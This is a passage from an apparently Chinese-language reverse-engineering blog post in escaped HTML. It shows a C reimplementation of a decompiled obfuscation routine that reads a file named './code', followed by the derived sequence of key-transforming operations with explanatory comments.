)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v15 = dword_202020[v13] &amp;amp; &lt;span class=&#34;number&#34;&gt;0xAABBCCDD&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v13 = ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//这句话的作用是把它范围限制在0-15位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum += v14 + v15;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v15 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v14 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   v9 = v8 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;  &lt;span class=&#34;comment&#34;&gt;//三个判断里都有,提出来&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//上面那一层判断完之后,再到下面,继续进行乱七八糟的操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v9 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum = ~randnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v10 = v9 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v10 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum ^= (((randnum &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ randnum) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (randnum &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 这一段和上面那个好像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v11 = v10 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = v11 &amp;amp; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v16 = &lt;span class=&#34;number&#34;&gt;539034132&lt;/span&gt; * dword_202020[v13]; &lt;span class=&#34;comment&#34;&gt;//0x20210214&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v13 = ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//这句话的作用是把它范围限制在0-15位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v17 = dword_202020[v13] - &lt;span class=&#34;number&#34;&gt;539034144&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//0x20210220&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v13 = ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//这句话的作用是把它范围限制在0-15位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum += v16 + v17;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v17 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v16 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = v11 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v12 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      randnum = randnum - (randnum &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (randnum &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; randnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FILE *stream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size_4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v0 = time(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srand(v0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2 = rand();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//printf(&amp;quot;%d\n&amp;quot;,v2);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stream = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;./code&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fseek(stream, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;size = ftell(stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fseek(stream, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;,stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size:%d\n&amp;quot;&lt;/span&gt;,size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( fread(ptr, size, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, stream) != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;Error reading file code\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;在外面的输出:%x\n&amp;quot;&lt;/span&gt;,&amp;amp;ptr); &lt;span class=&#34;comment&#34;&gt;//这里输出的有问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ptr:%p\n&amp;quot;&lt;/span&gt;,ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;amp;ptr:%p\n&amp;quot;&lt;/span&gt;,&amp;amp;ptr); &lt;span class=&#34;comment&#34;&gt;//&amp;amp;ptr的地址,里面存着ptr的地址,ptr地址里面存着数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;size_4 = hunxiao(v2,size,ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		运行代码,得到key的处理代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;1256252113&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;636006435&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;1908961232&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;3791846473&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;3767795326&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;371756133&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key=~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



